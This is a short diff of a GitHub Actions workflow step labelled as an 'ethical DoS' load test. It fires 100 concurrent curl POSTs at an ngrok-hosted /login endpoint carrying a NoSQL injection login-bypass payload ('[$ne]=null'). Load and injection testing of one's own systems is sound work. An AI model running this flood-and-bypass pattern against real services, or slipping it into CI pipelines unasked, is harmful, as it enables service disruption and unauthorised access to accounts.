@@ -27,7 +27,6 @@ jobs:
       - name: Simulate Load Test (Ethical DoS)
         run: |
           echo "Simulating light DoS (load test)..."
-          -H "X-Simulated-By: GitHubAction" \
           for i in {1..100}; do
           curl -s -X POST https://9961-196-184-98-202.ngrok-free.app/login       -H "X-Simulated-By: GitHubAction" \
           -d 'username[$ne]=null&password[$ne]=null' &
